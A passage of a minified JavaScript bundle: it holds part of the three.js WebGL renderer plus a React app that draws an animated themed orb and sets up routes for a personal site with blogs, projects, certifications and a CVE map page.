0&&(rn.dfgLUT.value=MC()),mn&&(ut.setValue(P,"toneMappingExposure",w.toneMappingExposure),ke.needsLights&&wy(rn,Xr),he&&q.fog===!0&&Pe.refreshFogUniforms(rn,he),Pe.refreshMaterialUniforms(rn,q,ge,oe,E.state.transmissionRenderTarget[T.id]),pl.upload(P,Ip(ke),rn,U)),q.isShaderMaterial&&q.uniformsNeedUpdate===!0&&(pl.upload(P,Ip(ke),rn,U),q.uniformsNeedUpdate=!1),q.isSpriteMaterial&&ut.setValue(P,"center",z.center),ut.setValue(P,"modelViewMatrix",z.modelViewMatrix),ut.setValue(P,"normalMatrix",z.normalMatrix),ut.setValue(P,"modelMatrix",z.matrixWorld),q.isShaderMaterial||q.isRawShaderMaterial){const Zt=q.uniformsGroups;for(let an=0,hc=Zt.length;an<hc;an++){const vs=Zt[an];ie.update(vs,fn),ie.bind(vs,fn)}}return fn}function wy(T,F){T.ambientLightColor.needsUpdate=F,T.lightProbe.needsUpdate=F,T.directionalLights.needsUpdate=F,T.directionalLightShadows.needsUpdate=F,T.pointLights.needsUpdate=F,T.pointLightShadows.needsUpdate=F,T.spotLights.needsUpdate=F,T.spotLightShadows.needsUpdate=F,T.rectAreaLights.needsUpdate=F,T.hemisphereLights.needsUpdate=F}function My(T){return T.isMeshLambertMaterial||T.isMeshToonMaterial||T.isMeshPhongMaterial||T.isMeshStandardMaterial||T.isShadowMaterial||T.isShaderMaterial&&T.lights===!0}this.getActiveCubeFace=function(){return k},this.getActiveMipmapLevel=function(){return H},this.getRenderTarget=function(){return V},this.setRenderTargetTextures=function(T,F,Y){const q=b.get(T);q.__autoAllocateDepthBuffer=T.resolveDepthBuffer===!1,q.__autoAllocateDepthBuffer===!1&&(q.__useRenderToTexture=!1),b.get(T.texture).__webglTexture=F,b.get(T.depthTexture).__webglTexture=q.__autoAllocateDepthBuffer?void 0:Y,q.__hasExternalTextures=!0},this.setRenderTargetFramebuffer=function(T,F){const Y=b.get(T);Y.__webglFramebuffer=F,Y.__useDefaultFramebuffer=F===void 0};const Ey=P.createFramebuffer();this.setRenderTarget=function(T,F=0,Y=0){V=T,k=F,H=Y;let q=null,z=!1,he=!1;if(T){const fe=b.get(T);if(fe.__useDefaultFramebuffer!==void 0){Ee.bindFramebuffer(P.FRAMEBUFFER,fe.__webglFramebuffer),X.copy(T.viewport),D.copy(T.scissor),N=T.scissorTest,Ee.viewport(X),Ee.scissor(D),Ee.setScissorTest(N),W=-1;return}else if(fe.__webglFramebuffer===void 0)U.setupRenderTarget(T);else if(fe.__hasExternalTextures)U.rebindTextures(T,b.get(T.texture).__webglTexture,b.get(T.depthTexture).__webglTexture);else if(T.depthBuffer){const Le=T.depthTexture;if(fe.__boundDepthTexture!==Le){if(Le!==null&&b.has(Le)&&(T.width!==Le.image.width||T.height!==Le.image.height))throw new Error("WebGLRenderTarget: Attached DepthTexture is initialized to the incorrect size.");U.setupDepthRenderbuffer(T)}}const be=T.texture;(be.isData3DTexture||be.isDataArrayTexture||be.isCompressedArrayTexture)&&(he=!0);const Ce=b.get(T).__webglFramebuffer;T.isWebGLCubeRenderTarget?(Array.isArray(Ce[F])?q=Ce[F][Y]:q=Ce[F],z=!0):T.samples>0&&U.useMultisampledRTT(T)===!1?q=b.get(T).__webglMultisampledFramebuffer:Array.isArray(Ce)?q=Ce[Y]:q=Ce,X.copy(T.viewport),D.copy(T.scissor),N=T.scissorTest}else X.copy(Z).multiplyScalar(ge).floor(),D.copy(ne).multiplyScalar(ge).floor(),N=_e;if(Y!==0&&(q=Ey),Ee.bindFramebuffer(P.FRAMEBUFFER,q)&&Ee.drawBuffers(T,q),Ee.viewport(X),Ee.scissor(D),Ee.setScissorTest(N),z){const fe=b.get(T.texture);P.framebufferTexture2D(P.FRAMEBUFFER,P.COLOR_ATTACHMENT0,P.TEXTURE_CUBE_MAP_POSITIVE_X+F,fe.__webglTexture,Y)}else if(he){const fe=F;for(let be=0;be<T.textures.length;be++){const Ce=b.get(T.textures[be]);P.framebufferTextureLayer(P.FRAMEBUFFER,P.COLOR_ATTACHMENT0+be,Ce.__webglTexture,Y,fe)}}else if(T!==null&&Y!==0){const fe=b.get(T.texture);P.framebufferTexture2D(P.FRAMEBUFFER,P.COLOR_ATTACHMENT0,P.TEXTURE_2D,fe.__webglTexture,Y)}W=-1},this.readRenderTargetPixels=function(T,F,Y,q,z,he,ye,fe=0){if(!(T&&T.isWebGLRenderTarget)){Ze("WebGLRenderer.readRenderTargetPixels: renderTarget is not THREE.WebGLRenderTarget.");return}let be=b.get(T).__webglFramebuffer;if(T.isWebGLCubeRenderTarget&&ye!==void 0&&(be=be[ye]),be){Ee.bindFramebuffer(P.FRAMEBUFFER,be);try{const Ce=T.textures[fe],Le=Ce.format,Re=Ce.type;if(!lt.textureFormatReadable(Le)){Ze("WebGLRenderer.readRenderTargetPixels: renderTarget is not in RGBA or implementation defined format.");return}if(!lt.textureTypeReadable(Re)){Ze("WebGLRenderer.readRenderTargetPixels: renderTarget is not in UnsignedByteType or implementation defined type.");return}F>=0&&F<=T.width-q&&Y>=0&&Y<=T.height-z&&(T.textures.length>1&&P.readBuffer(P.COLOR_ATTACHMENT0+fe),P.readPixels(F,Y,q,z,ae.convert(Le),ae.convert(Re),he))}finally{const Ce=V!==null?b.get(V).__webglFramebuffer:null;Ee.bindFramebuffer(P.FRAMEBUFFER,Ce)}}},this.readRenderTargetPixelsAsync=async function(T,F,Y,q,z,he,ye,fe=0){if(!(T&&T.isWebGLRenderTarget))throw new Error("THREE.WebGLRenderer.readRenderTargetPixels: renderTarget is not THREE.WebGLRenderTarget.");let be=b.get(T).__webglFramebuffer;if(T.isWebGLCubeRenderTarget&&ye!==void 0&&(be=be[ye]),be)if(F>=0&&F<=T.width-q&&Y>=0&&Y<=T.height-z){Ee.bindFramebuffer(P.FRAMEBUFFER,be);const Ce=T.textures[fe],Le=Ce.format,Re=Ce.type;if(!lt.textureFormatReadable(Le))throw new Error("THREE.WebGLRenderer.readRenderTargetPixelsAsync: renderTarget is not in RGBA or implementation defined format.");if(!lt.textureTypeReadable(Re))throw new Error("THREE.WebGLRenderer.readRenderTargetPixelsAsync: renderTarget is not in UnsignedByteType or implementation defined type.");const Ve=P.createBuffer();P.bindBuffer(P.PIXEL_PACK_BUFFER,Ve),P.bufferData(P.PIXEL_PACK_BUFFER,he.byteLength,P.STREAM_READ),T.textures.length>1&&P.readBuffer(P.COLOR_ATTACHMENT0+fe),P.readPixels(F,Y,q,z,ae.convert(Le),ae.convert(Re),0);const rt=V!==null?b.get(V).__webglFramebuffer:null;Ee.bindFramebuffer(P.FRAMEBUFFER,rt);const yt=P.fenceSync(P.SYNC_GPU_COMMANDS_COMPLETE,0);return P.flush(),await zw(P,yt,4),P.bindBuffer(P.PIXEL_PACK_BUFFER,Ve),P.getBufferSubData(P.PIXEL_PACK_BUFFER,0,he),P.deleteBuffer(Ve),P.deleteSync(yt),he}else throw new Error("THREE.WebGLRenderer.readRenderTargetPixelsAsync: requested read bounds are out of range.")},this.copyFramebufferToTexture=function(T,F=null,Y=0){const q=Math.pow(2,-Y),z=Math.floor(T.image.width*q),he=Math.floor(T.image.height*q),ye=F!==null?F.x:0,fe=F!==null?F.y:0;U.setTexture2D(T,0),P.copyTexSubImage2D(P.TEXTURE_2D,Y,0,0,ye,fe,z,he),Ee.unbindTexture()};const Ty=P.createFramebuffer(),Ay=P.createFramebuffer();this.copyTextureToTexture=function(T,F,Y=null,q=null,z=0,he=null){he===null&&(z!==0?(Ya("WebGLRenderer: copyTextureToTexture function signature has changed to support src and dst mipmap levels."),he=z,z=0):he=0);let ye,fe,be,Ce,Le,Re,Ve,rt,yt;const xt=T.isCompressedTexture?T.mipmaps[he]:T.image;if(Y!==null)ye=Y.max.x-Y.min.x,fe=Y.max.y-Y.min.y,be=Y.isBox3?Y.max.z-Y.min.z:1,Ce=Y.min.x,Le=Y.min.y,Re=Y.isBox3?Y.min.z:0;else{const Tn=Math.pow(2,-z);ye=Math.floor(xt.width*Tn),fe=Math.floor(xt.height*Tn),T.isDataArrayTexture?be=xt.depth:T.isData3DTexture?be=Math.floor(xt.depth*Tn):be=1,Ce=0,Le=0,Re=0}q!==null?(Ve=q.x,rt=q.y,yt=q.z):(Ve=0,rt=0,yt=0);const ot=ae.convert(F.format),ke=ae.convert(F.type);let nt;F.isData3DTexture?(U.setTexture3D(F,0),nt=P.TEXTURE_3D):F.isDataArrayTexture||F.isCompressedArrayTexture?(U.setTexture2DArray(F,0),nt=P.TEXTURE_2D_ARRAY):(U.setTexture2D(F,0),nt=P.TEXTURE_2D),P.pixelStorei(P.UNPACK_FLIP_Y_WEBGL,F.flipY),P.pixelStorei(P.UNPACK_PREMULTIPLY_ALPHA_WEBGL,F.premultiplyAlpha),P.pixelStorei(P.UNPACK_ALIGNMENT,F.unpackAlignment);const Ke=P.getParameter(P.UNPACK_ROW_LENGTH),fn=P.getParameter(P.UNPACK_IMAGE_HEIGHT),js=P.getParameter(P.UNPACK_SKIP_PIXELS),mn=P.getParameter(P.UNPACK_SKIP_ROWS),Xr=P.getParameter(P.UNPACK_SKIP_IMAGES);P.pixelStorei(P.UNPACK_ROW_LENGTH,xt.width),P.pixelStorei(P.UNPACK_IMAGE_HEIGHT,xt.height),P.pixelStorei(P.UNPACK_SKIP_PIXELS,Ce),P.pixelStorei(P.UNPACK_SKIP_ROWS,Le),P.pixelStorei(P.UNPACK_SKIP_IMAGES,Re);const ut=T.isDataArrayTexture||T.isData3DTexture,rn=F.isDataArrayTexture||F.isData3DTexture;if(T.isDepthTexture){const Tn=b.get(T),Zt=b.get(F),an=b.get(Tn.__renderTarget),hc=b.get(Zt.__renderTarget);Ee.bindFramebuffer(P.READ_FRAMEBUFFER,an.__webglFramebuffer),Ee.bindFramebuffer(P.DRAW_FRAMEBUFFER,hc.__webglFramebuffer);for(let vs=0;vs<be;vs++)ut&&(P.framebufferTextureLayer(P.READ_FRAMEBUFFER,P.COLOR_ATTACHMENT0,b.get(T).__webglTexture,z,Re+vs),P.framebufferTextureLayer(P.DRAW_FRAMEBUFFER,P.COLOR_ATTACHMENT0,b.get(F).__webglTexture,he,yt+vs)),P.blitFramebuffer(Ce,Le,ye,fe,Ve,rt,ye,fe,P.DEPTH_BUFFER_BIT,P.NEAREST);Ee.bindFramebuffer(P.READ_FRAMEBUFFER,null),Ee.bindFramebuffer(P.DRAW_FRAMEBUFFER,null)}else if(z!==0||T.isRenderTargetTexture||b.has(T)){const Tn=b.get(T),Zt=b.get(F);Ee.bindFramebuffer(P.READ_FRAMEBUFFER,Ty),Ee.bindFramebuffer(P.DRAW_FRAMEBUFFER,Ay);for(let an=0;an<be;an++)ut?P.framebufferTextureLayer(P.READ_FRAMEBUFFER,P.COLOR_ATTACHMENT0,Tn.__webglTexture,z,Re+an):P.framebufferTexture2D(P.READ_FRAMEBUFFER,P.COLOR_ATTACHMENT0,P.TEXTURE_2D,Tn.__webglTexture,z),rn?P.framebufferTextureLayer(P.DRAW_FRAMEBUFFER,P.COLOR_ATTACHMENT0,Zt.__webglTexture,he,yt+an):P.framebufferTexture2D(P.DRAW_FRAMEBUFFER,P.COLOR_ATTACHMENT0,P.TEXTURE_2D,Zt.__webglTexture,he),z!==0?P.blitFramebuffer(Ce,Le,ye,fe,Ve,rt,ye,fe,P.COLOR_BUFFER_BIT,P.NEAREST):rn?P.copyTexSubImage3D(nt,he,Ve,rt,yt+an,Ce,Le,ye,fe):P.copyTexSubImage2D(nt,he,Ve,rt,Ce,Le,ye,fe);Ee.bindFramebuffer(P.READ_FRAMEBUFFER,null),Ee.bindFramebuffer(P.DRAW_FRAMEBUFFER,null)}else rn?T.isDataTexture||T.isData3DTexture?P.texSubImage3D(nt,he,Ve,rt,yt,ye,fe,be,ot,ke,xt.data):F.isCompressedArrayTexture?P.compressedTexSubImage3D(nt,he,Ve,rt,yt,ye,fe,be,ot,xt.data):P.texSubImage3D(nt,he,Ve,rt,yt,ye,fe,be,ot,ke,xt):T.isDataTexture?P.texSubImage2D(P.TEXTURE_2D,he,Ve,rt,ye,fe,ot,ke,xt.data):T.isCompressedTexture?P.compressedTexSubImage2D(P.TEXTURE_2D,he,Ve,rt,xt.width,xt.height,ot,xt.data):P.texSubImage2D(P.TEXTURE_2D,he,Ve,rt,ye,fe,ot,ke,xt);P.pixelStorei(P.UNPACK_ROW_LENGTH,Ke),P.pixelStorei(P.UNPACK_IMAGE_HEIGHT,fn),P.pixelStorei(P.UNPACK_SKIP_PIXELS,js),P.pixelStorei(P.UNPACK_SKIP_ROWS,mn),P.pixelStorei(P.UNPACK_SKIP_IMAGES,Xr),he===0&&F.generateMipmaps&&P.generateMipmap(nt),Ee.unbindTexture()},this.initRenderTarget=function(T){b.get(T).__webglFramebuffer===void 0&&U.setupRenderTarget(T)},this.initTexture=function(T){T.isCubeTexture?U.setTextureCube(T,0):T.isData3DTexture?U.setTexture3D(T,0):T.isDataArrayTexture||T.isCompressedArrayTexture?U.setTexture2DArray(T,0):U.setTexture2D(T,0),Ee.unbindTexture()},this.resetState=function(){k=0,H=0,V=null,Ee.reset(),ve.reset()},typeof __THREE_DEVTOOLS__<"u"&&__THREE_DEVTOOLS__.dispatchEvent(new CustomEvent("observe",{detail:this}))}get coordinateSystem(){return ri}get outputColorSpace(){return this._outputColorSpace}set outputColorSpace(e){this._outputColorSpace=e;const n=this.getContext();n.drawingBufferColorSpace=je._getDrawingBufferColorSpace(e),n.unpackColorSpace=je._getUnpackColorSpace()}}const ag={light:{base:"#f1f0ec",hot:"#facb0e",warm:"#ff642f",cool:"#78bae6",accent:"#f06ba8"},dark:{base:"#1d1d1d",hot:"#facb0e",warm:"#ff642f",cool:"#78bae6",accent:"#f06ba8"}};function TC(){const t=$.useRef(null);return $.useEffect(()=>{const e=t.current;if(!e)return;const n=new EC({canvas:e,antialias:!0,alpha:!0,powerPreference:"high-performance"});n.setPixelRatio(Math.min(window.devicePixelRatio||1,2)),n.setClearColor(0,0);const i=new hM,s=new xn(35,1,.1,100);s.position.set(0,0,7);const r=new fa;i.add(r);const a=document.createElement("canvas");a.width=512,a.height=512;const o=a.getContext("2d");if(!o){n.dispose();return}const l=new vM(a);l.wrapS=ja,l.wrapT=ja,l.center.set(.5,.5);const c=new _M({map:l,emissiveMap:l,emissive:new Xe("#ffffff"),emissiveIntensity:.6,metalness:.15,roughness:.3,transparent:!0,opacity:.95}),h=new In(new Ep(2.1,128,128),c);r.add(h);const d=new wp({color:new Xe("#1d1d1d"),transparent:!0,opacity:.22}),p=new In(new Hl(2.9,.02,16,180),d);p.rotation.set(Math.PI*.4,Math.PI*.15,0),r.add(p);const f=new In(new Hl(3.25,.015,16,180),d.clone());f.rotation.set(Math.PI*.9,Math.PI*.2,.2),f.material.opacity=.14,r.add(f);const y=new AM(16777215,.65),_=new TM(16777215,.5);_.position.set(4,2,5);const g=new MM(16737327,.45,20);g.position.set(-6,1,6),i.add(y,_,g);const u=M=>{const k=a.width;o.clearRect(0,0,k,k),o.fillStyle=M.base,o.fillRect(0,0,k,k);const H=o.createRadialGradient(k*.28,k*.28,k*.1,k*.55,k*.55,k*.6);H.addColorStop(0,M.hot),H.addColorStop(.35,M.warm),H.addColorStop(.7,M.cool),H.addColorStop(1,"rgba(0,0,0,0)"),o.globalCompositeOperation="screen",o.fillStyle=H,o.fillRect(0,0,k,k);const V=o.createRadialGradient(k*.75,k*.2,k*.08,k*.7,k*.2,k*.45);V.addColorStop(0,M.accent),V.addColorStop(1,"rgba(0,0,0,0)"),o.fillStyle=V,o.fillRect(0,0,k,k),o.globalCompositeOperation="source-over",l.needsUpdate=!0},v=()=>{const M=document.body.classList.contains("dark");u(M?ag.dark:ag.light),c.emissiveIntensity=M?.45:.6,c.opacity=M?.88:.95,p.material.color.set(M?"#e5e4e0":"#1d1d1d"),p.material.opacity=M?.26:.22,f.material.color.set(M?"#e5e4e0":"#1d1d1d"),f.material.opacity=M?.18:.14,y.intensity=M?.45:.65,g.intensity=M?.35:.45};let x=2.1,S=1.2;const E=()=>{const M=window.innerWidth,k=window.innerHeight;n.setSize(M,k,!1),s.aspect=M/k,s.updateProjectionMatrix();const H=M/k>1.05,V=H?1:.82;r.scale.setScalar(V),x=H?2.1:1.3,S=H?1.2:.6,r.position.set(x,S,0)};E(),v();const A=new MutationObserver(v);A.observe(document.body,{attributes:!0,attributeFilter:["class"]}),window.addEventListener("resize",E);let C=0;const L=new RM,w=()=>{const M=L.getElapsedTime();h.rotation.y=M*.18,h.rotation.x=Math.sin(M*.2)*.08,p.rotation.z=M*.08,f.rotation.z=-M*.06,r.position.y=S+Math.sin(M*.3)*.08,l.rotation=Math.sin(M*.08)*.04,l.offset.set(Math.sin(M*.03)*.02,Math.cos(M*.04)*.02),n.render(i,s),C=requestAnimationFrame(w)};return w(),()=>{window.removeEventListener("resize",E),A.disconnect(),C&&cancelAnimationFrame(C),h.geometry.dispose(),c.dispose(),l.dispose(),p.geometry.dispose(),d.dispose(),f.geometry.dispose(),f.material.dispose(),n.dispose()}},[]),m.jsx("div",{className:"orb-field","aria-hidden":"true",children:m.jsx("canvas",{ref:t,className:"orb-canvas"})})}function AC(){const[t,e]=$.useState(()=>typeof window>"u"?"light":localStorage.getItem("theme")||"light");return $.useEffect(()=>{const i=document.body;i.classList.remove("light","dark"),i.classList.add(t),localStorage.setItem("theme",t)},[t]),{theme:t,toggleTheme:()=>{e(i=>i==="light"?"dark":"light")}}}function CC(){const{theme:t,toggleTheme:e}=AC();return m.jsx(nS,{children:m.jsxs("div",{className:"app-shell",children:[m.jsx(TC,{}),m.jsx(aw,{}),m.jsx(sw,{}),m.jsx(aS,{onToggleTheme:e,theme:t}),m.jsx("main",{children:m.jsxs($b,{children:[m.jsx(Wi,{path:"/",element:m.jsx(nm,{})}),m.jsx(Wi,{path:"/blogs",element:m.jsx(bS,{})}),m.jsx(Wi,{path:"/projects",element:m.jsx(HS,{})}),m.jsx(Wi,{path:"/certifications",element:m.jsx(GS,{})}),m.jsx(Wi,{path:"/blog/:slug",element:m.jsx(VS,{})}),m.jsx(Wi,{path:"/cve-map",element:m.jsx(nw,{})}),m.jsx(Wi,{path:"*",element:m.jsx(nm,{})})]})}),m.jsx(iw,{}),m.jsx(uS,{}),m.jsx(rw,{})]})})}_0(document.getElementById("root")).render(m.jsx(vg.StrictMode,{children:m.jsx(CC,{})}));
